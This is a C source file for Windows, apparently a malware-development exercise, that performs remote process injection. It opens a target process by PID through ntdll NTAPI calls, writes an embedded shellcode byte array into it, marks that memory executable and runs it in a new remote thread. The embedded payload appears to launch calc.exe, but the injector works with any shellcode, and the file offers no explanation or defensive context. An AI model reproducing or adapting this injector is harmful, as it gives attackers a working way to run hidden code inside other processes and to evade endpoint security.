#include <windows.h>
#include <stdio.h>
#include "essentials.h"
int main(int argc, char const *argv[])
{
    if(argc != 2){
        warn("usage: %s <PID>",argv[0]);
        return EXIT_FAILURE;
    }
    NTSTATUS status = NULL;
    HANDLE hProcess, hThread = NULL;
    const UCHAR someting[] = {"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
        "\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
        "\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
        "\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
        "\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
        "\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
        "\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
        "\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
        "\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
        "\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
        "\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
        "\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
        "\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
        "\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
        "\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
        "\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
        "\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
        "\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"};
    SIZE_T sizeOfCode = sizeof(someting);
    PVOID rBuffer = NULL;
    SIZE_T written = 0;
    HMODULE hNTDLL;
    DWORD PID = NULL;
    PID = atoi(argv[1]);
    OBJECT_ATTRIBUTES oa = {sizeof(oa), NULL};
    CLIENT_ID CID = {NULL};
    CID.UniqueProcess = (HANDLE)PID; 
    ULONG OldProtection = 0;
    
    hNTDLL = GetModule(L"ntdll.dll");

    NtOpenProcess ntOpenProcess = (NtOpenProcess)GetProcAddress(hNTDLL, "NtOpenProcess");
    NtCreateThreadEx ntCreateThreadEx = (NtCreateThreadEx)GetProcAddress(hNTDLL,"NtCreateThreadEx");
    NtAllocateVirtualMemory ntAllocateVirtualMemory = (NtAllocateVirtualMemory)GetProcAddress(hNTDLL,"NtAllocateVirtualMemory");
    NtWriteVirtualMemory ntWriteVirtualMemory = (NtWriteVirtualMemory)GetProcAddress(hNTDLL,"NtWriteVirtualMemory");
    NtProtectVirtualMemory ntProtectVirtualMemory = (NtProtectVirtualMemory)GetProcAddress(hNTDLL,"NtProtectVirtualMemory");

    status = ntOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &oa, &CID);  
    
    if(status != STATUS_SUCCESS){
        warn("Error! [NtOpenProcess] failed to get a handle on the process, error: 0x%lx",status);
        return EXIT_FAILURE;
    }
    okay("Got a handle on the process (%ld)",PID);

    status = ntAllocateVirtualMemory(hProcess, &rBuffer, 0, &sizeOfCode, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
    if(status != STATUS_SUCCESS){
        warn("Error! [NtAllocateVirtualMemory] failed to allocate the memory, error: 0x%lx",status);
        return EXIT_FAILURE;
    }

    for(int i = 0; i<= 128; i++){
        if(i % 16 == 0 ){
            printf("\n ");
        }
        Sleep(1);
        printf(" %02X",someting[i]);
    }

    status = ntWriteVirtualMemory(hProcess, rBuffer, (PVOID)someting, sizeof(someting), &written);
    if(status != STATUS_SUCCESS){
        warn("Error! [NtWriteVirtualMemory] failed to write the memory, error: 0x%lx",status);
        return EXIT_FAILURE;
    }

    status = ntProtectVirtualMemory(hProcess, &rBuffer, &sizeOfCode, PAGE_EXECUTE_READ, &OldProtection);

    status = ntCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &oa, hProcess, rBuffer, FALSE, 0, 0, 0, 0, NULL);
    if(status != STATUS_SUCCESS){
        warn("Error! [NtCreateThreadEx] failed to get a handle on the process, error: 0x%lx",status);
        return EXIT_FAILURE;
    }

    WaitForSingleObject(hThread, INFINITE);
    okay("\nFinished execution!");
    goto CLEANUP;

CLEANUP:
    if(hThread){
        CloseHandle(hThread);
    }
    if(hProcess){
        CloseHandle(hProcess);
    }
    return EXIT_SUCCESS;
}
